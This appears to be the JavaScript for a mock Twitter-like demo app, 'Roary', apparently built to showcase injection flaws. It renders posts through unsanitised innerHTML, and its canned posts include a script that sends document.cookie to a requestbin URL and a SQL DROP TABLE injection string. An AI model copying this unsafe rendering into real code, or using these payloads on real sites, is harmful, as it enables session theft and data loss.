/*
 * Roary - Twitter-like posting service
 * Modular JavaScript for post management
 */

const CONFIG = {
    timing: {
        initialPostDelay: 10000, // ms - delay before first random post
        minPostInterval: 15000, // ms - minimum time between random posts
        maxPostInterval: 20000 // ms - maximum time between random posts
    },
    users: [
        { avatar: '🐸', username: 'FroggyFrank0x539' },
        { avatar: '🐢', username: 'TubularTurtle0x2A' },
        { avatar: '🐍', username: 'SlickSnake25' },
        { avatar: '🦖', username: 'RadicalRex247' },
        { avatar: '🦕', username: 'DynamiteDino1337' },
        { avatar: '🐶', username: 'DoggyDan342' },
        { avatar: '🐱', username: 'CoolCat66' },
        { avatar: '🦋', username: 'ButterflyBetty42' },
        { avatar: '🐻', username: 'BodaciousBear12' }
    ],
    randomPosts: [
        "I love cookies!🍪 '<script>window.location.replace(\"https://requestbin.kanbanbox.com/ACB798?\" + document.cookie)</script>'",
        "Is there a seahorse emoji?🐎",
        "Are there any NFL teams that don't end in s?",
        "When will there be soja-döner again??😥",
        "Hey \"@'; DROP TABLE users;--\", how are you doing? 🗑️",
        "Attention, the floor is java! ☕",
        "Why do Java developers wear glasses? Because they don't C# 😎",
        "I'm not procrastinating, I'm just refactoring my time ⏰",
        "404: Motivation not found 😴",
        "Copy-paste from Stack Overflow without reading: 10% of the time, it works every time 📋",
        "There's no place like 127.0.0.1 🏠"
    ]
};

/*
 * Utilities
 */
const Utils = {
    formatTime(date) {
        const hours = date.getHours().toString().padStart(2, '0');
        const minutes = date.getMinutes().toString().padStart(2, '0');
        return `${hours}:${minutes}`;
    },

    getRandomElement(array) {
        return array[Math.floor(Math.random() * array.length)];
    },

    getRandomInterval(min, max) {
        return Math.random() * (max - min) + min;
    }
};

/*
 * Post Management
 */
const PostManager = {
    createPostElement(content, isUser) {
        const article = document.createElement('article');
        article.className = 'terminal-card';
        article.style.marginBottom = '1.5rem';
        article.style.padding = '1.5rem';
        
        let avatar, username;
        if (isUser) {
            avatar = '🐧';
            username = 'YOU';
        } else {
            // Random post simulation
            const randomUser = Utils.getRandomElement(CONFIG.users);
            avatar = randomUser.avatar;
            username = randomUser.username;
        }
        
        const time = Utils.formatTime(new Date());
        
        article.innerHTML = `
            <header style="display: flex; align-items: center; justify-content: space-between; border: 1px solid var(--secondary-color); border-radius: 0.3rem; padding: 0.4rem 0.75rem; margin-bottom: 1rem; font-size: 0.95rem; font-weight: normal; background: none;">
                <span style=\"display: flex; align-items: center; gap: 0.5em;\">
                    <span style=\"font-size: 1.2em;\">${avatar}</span>
                    <span style=\"font-weight: bold; color: var(--primary-color);\">${username}</span>
                </span>
                <span style=\"color: var(--secondary-color); font-size: 0.95em;\">${time}</span>
            </header>
            <div style="line-height: 1.6;">${content}</div>
        `;
        
        return article;
    },

    addToFeed(post) {
        const feed = document.getElementById('feed');
        if (feed) {
            feed.insertBefore(post, feed.firstChild);
        }
    },

    createAndAddPost(content, isUser) {
        const post = this.createPostElement(content, isUser);
        this.addToFeed(post);
    }
};

/*
 * User Actions
 */
const UserActions = {
    postRoar() {
        const postInput = document.getElementById('postInput');
        if (!postInput) return;
        
        const content = postInput.value.trim();
        
        if (content === '') return;
        
        postInput.value = '';

        PostManager.createAndAddPost(content, true);
    }
};

/*
 * Random Post Simulation
 */
const RandomPostSimulator = {
    scheduleNextPost() {
        const interval = Utils.getRandomInterval(
            CONFIG.timing.minPostInterval,
            CONFIG.timing.maxPostInterval
        );
        
        setTimeout(() => {
            this.generateRandomPost();
        }, interval);
    },

    generateRandomPost() {
        const content = Utils.getRandomElement(CONFIG.randomPosts);
        PostManager.createAndAddPost(content, false);
        this.scheduleNextPost();
    },

    start() {
        setTimeout(() => {
            this.generateRandomPost();
        }, CONFIG.timing.initialPostDelay);
    }
};

/*
 * Initialize Application
 */
function initializeApp() {
    const postBtn = document.getElementById('postBtn');
    
    if (postBtn) {
        postBtn.addEventListener('click', () => UserActions.postRoar());
    }
    
    // Start random post simulation
    window.addEventListener('load', () => {
        RandomPostSimulator.start();
    });
}

// Start application when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeApp);
} else {
    initializeApp();
}
